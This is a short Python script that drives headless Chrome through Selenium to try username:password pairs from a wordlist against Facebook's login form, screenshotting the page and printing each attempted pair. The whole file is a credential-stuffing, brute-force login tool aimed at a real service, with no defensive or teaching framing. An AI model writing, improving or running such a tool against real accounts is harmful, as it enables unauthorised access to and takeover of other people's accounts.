import selenium
import requests
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys

URL = "https://www.facebook.com"
CHROME_DVR_DIR = './engine/chromedriver'
WORDLIST_DIR = 'wordlist.txt'

def check_url(url):
    try:
        request = requests.get(url)
        if request.status_code == 200:
            return True
        else:
            return False
    except:
        pass

name = URL.split('.')[1]
f = open(WORDLIST_DIR, 'r')
chrome_options = webdriver.ChromeOptions()
# chrome_options.add_argument("--window-size=1024x768")
chrome_options.add_argument("--disable-popup-blocking")
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--headless")
check_url(URL)
with webdriver.Chrome(executable_path=CHROME_DVR_DIR,options=chrome_options) as driver:
    driver.get(URL)
    driver.save_screenshot(f"./images/{name}.png")
    temp= ""
    while True:
        try:
            for line in f:
                splited_line = line.split(':')
                username=splited_line[0]
                password=splited_line[1]
                print(username,password)
                #driver.maximize_window()  # For maximizing window
                driver.get(URL)
                time.sleep(2)
                sel_username = driver.find_element_by_name("email")
                sel_password = driver.find_element_by_name("pass")
                sel_username.send_keys(username)
                sel_password.send_keys(password)
                #sel_password.submit()
                #sel_password.send_keys(Keys.ENTER)
                sel_button = driver.find_element_by_name("login")
                print('------------')
                print(f'Tried username: {username}')
                print(f'Tried password: {password}')
                print('------------')
                #sel_password.submit()
                sel_button.click()
                time.sleep(3)
                temp= line
        except KeyboardInterrupt:
            exit()

